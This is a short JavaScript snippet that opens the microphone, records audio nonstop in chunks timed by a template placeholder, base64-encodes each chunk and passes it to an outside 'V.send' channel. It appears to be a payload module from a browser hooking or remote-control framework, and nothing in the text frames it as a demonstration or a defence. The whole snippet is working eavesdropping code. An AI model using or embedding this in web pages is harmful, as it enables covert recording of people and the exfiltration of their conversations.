navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
    const mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.start();

    mediaRecorder.addEventListener("dataavailable", event => {
        const audioBlob = new Blob([event.data]);
        var reader = new FileReader();
        reader.readAsDataURL(audioBlob);
        reader.onloadend = function () {
            var base64data = reader.result.split('base64,')[1];
            V.send(base64data);
        }
    });

    setInterval(() => {
        mediaRecorder.stop();
        mediaRecorder.start();
    }, parseInt("%{save}") || 2000);
});
